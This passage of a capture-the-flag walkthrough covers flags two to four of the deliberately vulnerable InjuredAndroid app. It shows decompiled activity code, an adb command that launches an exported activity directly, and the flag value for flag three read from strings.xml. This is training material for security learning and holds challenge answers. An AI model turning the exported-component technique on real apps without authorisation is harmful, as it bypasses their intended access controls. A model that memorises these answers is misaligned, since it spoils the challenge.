class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Reviewing the manifest we can find a few exported activities, however, the one we want is <code class=\"language-plaintext highlighter-rouge\">b25lActivity</code>.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">&lt;</span><span class=\"nt\">activity</span> <span class=\"na\">android</span><span class=\"err\">:</span><span class=\"na\">name</span><span class=\"p\">=</span><span class=\"s\">\".b25lActivity\"</span> <span class=\"na\">android</span><span class=\"err\">:</span><span class=\"na\">exported</span><span class=\"p\">=</span><span class=\"s\">\"true\"</span> <span class=\"p\">/&gt;</span></code></pre></div></div><p>Once we open <code class=\"language-plaintext highlighter-rouge\">b25lActivity</code> we will see that using this activity will trigger the flag for this flag activity.</p><div class=\"language-jsx highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kr\">package</span> <span class=\"nx\">b3nac</span><span class=\"p\">.</span><span class=\"nx\">injuredandroid</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"nx\">android</span><span class=\"p\">.</span><span class=\"nx\">os</span><span class=\"p\">.</span><span class=\"nx\">Bundle</span><span class=\"p\">;</span><span class=\"cm\">/* loaded from: classes.dex */</span><span class=\"kr\">public</span> <span class=\"nx\">final</span> <span class=\"kd\">class</span> <span class=\"nc\">b25lActivity</span> <span class=\"kd\">extends</span> <span class=\"nc\">androidx</span><span class=\"p\">.</span><span class=\"nx\">appcompat</span><span class=\"p\">.</span><span class=\"nx\">app</span><span class=\"p\">.</span><span class=\"nx\">c</span> <span class=\"p\">{</span>    <span class=\"cm\">/* JADX INFO: Access modifiers changed from: protected */</span>    <span class=\"p\">@</span><span class=\"nd\">Override</span> <span class=\"c1\">// androidx.appcompat.app.c, androidx.fragment.app.d, androidx.activity.ComponentActivity, androidx.core.app.e, android.app.Activity</span>    <span class=\"kr\">public</span> <span class=\"k\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">Bundle</span> <span class=\"nx\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"nx\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"nx\">R</span><span class=\"p\">.</span><span class=\"nx\">layout</span><span class=\"p\">.</span><span class=\"nx\">activity_b25l</span><span class=\"p\">);</span>        <span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nx\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">);</span>        <span class=\"k\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">M</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">);</span>        <span class=\"k\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">flagTwoButtonColor</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To call the activity: <code class=\"language-plaintext highlighter-rouge\">adb shell am start -n b3nac.injuredandroid/b3nac.injuredandroid.b25lActivity</code></p><p><img src=\"assets/images/flag2.png\" alt=\"flag2.png\" /></p><h1 id=\"flag-three-resources\">Flag Three: Resources</h1><p>Now onto <code class=\"language-plaintext highlighter-rouge\">FlagThreeActivity</code> we can see that within <code class=\"language-plaintext highlighter-rouge\">submitFlag()</code> our user-supplied string is being compared to a string that is being retrieved using <code class=\"language-plaintext highlighter-rouge\">getString()</code>.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.content.Intent</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.os.Bundle</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.view.View</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.widget.EditText</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">androidx.appcompat.widget.Toolbar</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.floatingactionbutton.FloatingActionButton</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.snackbar.Snackbar</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">FlagThreeActivity</span> <span class=\"n\">extends</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span> <span class=\"p\">{</span>    <span class=\"n\">private</span> <span class=\"nb\">int</span> <span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span>    <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">a</span> <span class=\"n\">implements</span> <span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span> <span class=\"p\">{</span>        <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"p\">}</span>        <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span>        <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagThreeActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">R stands for resources.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagThreeActivity</span> <span class=\"n\">flagThreeActivity</span> <span class=\"o\">=</span> <span class=\"n\">FlagThreeActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">;</span>                <span class=\"n\">flagThreeActivity</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"n\">flagThreeActivity</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">);</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagThreeActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X2</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Check .xml files.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagThreeActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"nb\">int</span> <span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"nb\">int</span> <span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">protected</span> <span class=\"o\">*/</span>    <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">activity</span><span class=\"p\">.</span><span class=\"n\">ComponentActivity</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">core</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">e</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">layout</span><span class=\"p\">.</span><span class=\"n\">activity_flag_three</span><span class=\"p\">);</span>        <span class=\"n\">j</span><span class=\"p\">.</span><span class=\"n\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">);</span>        <span class=\"nc\">C</span><span class=\"p\">((</span><span class=\"n\">Toolbar</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">toolbar</span><span class=\"p\">));</span>        <span class=\"p\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nf\">a</span><span class=\"p\">());</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">submitFlag</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">EditText</span> <span class=\"n\">editText</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">editText2</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">editText</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">editText2</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">editText</span><span class=\"p\">.</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">(),</span> <span class=\"nf\">getString</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">string</span><span class=\"p\">.</span><span class=\"n\">cmVzb3VyY2VzX3lv</span><span class=\"p\">)))</span> <span class=\"p\">{</span>            <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"n\">FlagOneSuccess</span><span class=\"p\">.</span><span class=\"n\">class</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">L</span><span class=\"p\">(</span><span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">flagThreeButtonColor</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"n\">intent</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Following the Androids documentation <code class=\"language-plaintext highlighter-rouge\">getString()</code> is retrieving the string with the name of <code class=\"language-plaintext highlighter-rouge\">cmVzb3VyY2VzX3lv</code> from <code class=\"language-plaintext highlighter-rouge\">res/values/*filename*.xml</code>. Opening res/values we can locate <code class=\"language-plaintext highlighter-rouge\">strings.xml</code>. A quick search for the string name and we find our flag.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&lt;</span><span class=\"n\">string</span> <span class=\"n\">name</span><span class=\"o\">=</span><span class=\"sh\">\"</span><span class=\"s\">cmVzb3VyY2VzX3lv</span><span class=\"sh\">\"</span><span class=\"o\">&gt;</span><span class=\"n\">F1ag_thr33</span><span class=\"o\">&lt;/</span><span class=\"n\">string</span><span class=\"o\">&gt;</span></code></pre></div></div><h1 id=\"flag-four-login-2\">Flag Four: Login 2</h1><p><code class=\"language-plaintext highlighter-rouge\">FlagFourActivity</code></p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">package</span> <span class=\"n\">b3nac</span><span class=\"p\">.</span><span class=\"n\">injuredandroid</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.content.Intent</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.os.Bundle</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.view.View</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">android.widget.EditText</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.floatingactionbutton.FloatingActionButton</span><span class=\"p\">;</span><span class=\"kn\">import</span> <span class=\"n\">com.google.android.material.snackbar.Snackbar</span><span class=\"p\">;</span><span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span><span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">FlagFourActivity</span> <span class=\"n\">extends</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span> <span class=\"p\">{</span>    <span class=\"n\">private</span> <span class=\"nb\">int</span> <span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"o\">/*</span> <span class=\"n\">loaded</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">classes</span><span class=\"p\">.</span><span class=\"n\">dex</span> <span class=\"o\">*/</span>    <span class=\"n\">static</span> <span class=\"n\">final</span> <span class=\"k\">class</span> <span class=\"nc\">a</span> <span class=\"n\">implements</span> <span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span> <span class=\"p\">{</span>        <span class=\"nf\">a</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"p\">}</span>        <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">View</span><span class=\"p\">.</span><span class=\"n\">OnClickListener</span>        <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">onClick</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagFourActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Where is bob.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagFourActivity</span> <span class=\"n\">flagFourActivity</span> <span class=\"o\">=</span> <span class=\"n\">FlagFourActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">;</span>                <span class=\"n\">flagFourActivity</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"n\">flagFourActivity</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">);</span>            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">FlagFourActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"o\">==</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"n\">Snackbar</span> <span class=\"n\">X2</span> <span class=\"o\">=</span> <span class=\"n\">Snackbar</span><span class=\"p\">.</span><span class=\"nc\">X</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">Classes and imports.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">Y</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">Action</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">null</span><span class=\"p\">);</span>                <span class=\"n\">X2</span><span class=\"p\">.</span><span class=\"nc\">N</span><span class=\"p\">();</span>                <span class=\"n\">FlagFourActivity</span><span class=\"p\">.</span><span class=\"n\">this</span><span class=\"p\">.</span><span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>            <span class=\"p\">}</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"nb\">int</span> <span class=\"nc\">F</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nc\">G</span><span class=\"p\">(</span><span class=\"nb\">int</span> <span class=\"n\">i</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">this</span><span class=\"p\">.</span><span class=\"n\">w</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"o\">/*</span> <span class=\"n\">JADX</span> <span class=\"n\">INFO</span><span class=\"p\">:</span> <span class=\"n\">Access</span> <span class=\"n\">modifiers</span> <span class=\"n\">changed</span> <span class=\"k\">from</span><span class=\"p\">:</span> <span class=\"n\">protected</span> <span class=\"o\">*/</span>    <span class=\"nd\">@Override</span> <span class=\"o\">//</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">appcompat</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">fragment</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">activity</span><span class=\"p\">.</span><span class=\"n\">ComponentActivity</span><span class=\"p\">,</span> <span class=\"n\">androidx</span><span class=\"p\">.</span><span class=\"n\">core</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">e</span><span class=\"p\">,</span> <span class=\"n\">android</span><span class=\"p\">.</span><span class=\"n\">app</span><span class=\"p\">.</span><span class=\"n\">Activity</span>    <span class=\"n\">public</span> <span class=\"n\">void</span> <span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">Bundle</span> <span class=\"n\">bundle</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">super</span><span class=\"p\">.</span><span class=\"nf\">onCreate</span><span class=\"p\">(</span><span class=\"n\">bundle</span><span class=\"p\">);</span>        <span class=\"nf\">setContentView</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"n\">layout</span><span class=\"p\">.</span><span class=\"n\">activity_flag_four</span><span class=\"p\">);</span>        <span class=\"n\">j</span><span class=\"p\">.</span><span class=\"n\">j</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">);</span>        <span class=\"p\">((</span><span class=\"n\">FloatingActionButton</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">fab</span><span class=\"p\">)).</span><span class=\"nf\">setOnClickListener</span><span class=\"p\">(</span><span class=\"n\">new</span> <span class=\"nf\">a</span><span class=\"p\">());</span>    <span class=\"p\">}</span>    <span class=\"n\">public</span> <span class=\"n\">final</span> <span class=\"n\">void</span> <span class=\"nf\">submitFlag</span><span class=\"p\">(</span><span class=\"n\">View</span> <span class=\"n\">view</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">EditText</span> <span class=\"n\">editText</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">EditText</span><span class=\"p\">)</span> <span class=\"nf\">findViewById</span><span class=\"p\">(</span><span class=\"n\">R</span><span class=\"p\">.</span><span class=\"nb\">id</span><span class=\"p\">.</span><span class=\"n\">editText2</span><span class=\"p\">);</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">editText</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">editText2</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"n\">String</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"n\">editText</span><span class=\"p\">.</span><span class=\"nf\">getText</span><span class=\"p\">().</span><span class=\"nf\">toString</span><span class=\"p\">();</span>        <span class=\"n\">byte</span><span class=\"p\">[]</span> <span class=\"n\">a2</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nf\">g</span><span class=\"p\">().</span><span class=\"nf\">a</span><span class=\"p\">();</span>        <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">d</span><span class=\"p\">(</span><span class=\"n\">a2</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">decoder.getData()</span><span class=\"sh\">\"</span><span class=\"p\">);</span>        <span class=\"nf\">if </span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">s</span><span class=\"p\">.</span><span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">g</span><span class=\"p\">.</span><span class=\"nf\">a</span><span class=\"p\">(</span><span class=\"n\">obj</span><span class=\"p\">,</span> <span class=\"n\">new</span> <span class=\"nc\">String</span><span class=\"p\">(</span><span class=\"n\">a2</span><span class=\"p\">,</span> <span class=\"n\">d</span><span class=\"p\">.</span><span class=\"n\">w</span><span class=\"p\">.</span><span class=\"n\">c</span><span class=\"p\">.</span><span class=\"n\">f2418a</span><span class=\"p\">)))</span> <span class=\"p\">{</span>            <span class=\"n\">Intent</span> <span class=\"n\">intent</span> <span class=\"o\">=</span> <span class=\"n\">new</span> <span class=\"nc\">Intent</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"n\">FlagOneSuccess</span><span class=\"p\">.</span><span class=\"n\">class</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nc\">FlagsOverview</span><span class=\"p\">().</span><span class=\"nc\">I</span><span class=\"p\">(</span><span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"n\">new</span> <span class=\"nf\">j</span><span class=\"p\">().</span><span class=\"nf\">b</span><span class=\"p\">(</span><span class=\"n\">this</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">flagFourButtonColor</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">true</span><span class=\"p\">);</span>            <span class=\"nf\">startActivity</span><span class=\"p\">(</span><span class=\"n\">intent</span><span class=\"p\">);</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Once again in <code class=\"language-plaintext highlighter-rouge\">submitFlag()</code> we can see that our user-supplied string is being compared to another string. This time it is being compared to <code class=\"language-plaintext highlighter-rouge\">String(a2, d.w.c.f2418a)</code>. We can also see that <code class=\"language-plaintext highlighter-rouge\">a2</code> is equal to <code class=\"language-plaintext highlighter-rouge\">g().a()</code>. Let’s start with <code class=\"language-plaintext highlighter-rouge\">d.w.c.f2418a</code>.</p><p>Opening up <code class=\"language-plaintext highlighter-rouge\">d.w.c</code> we can find <code 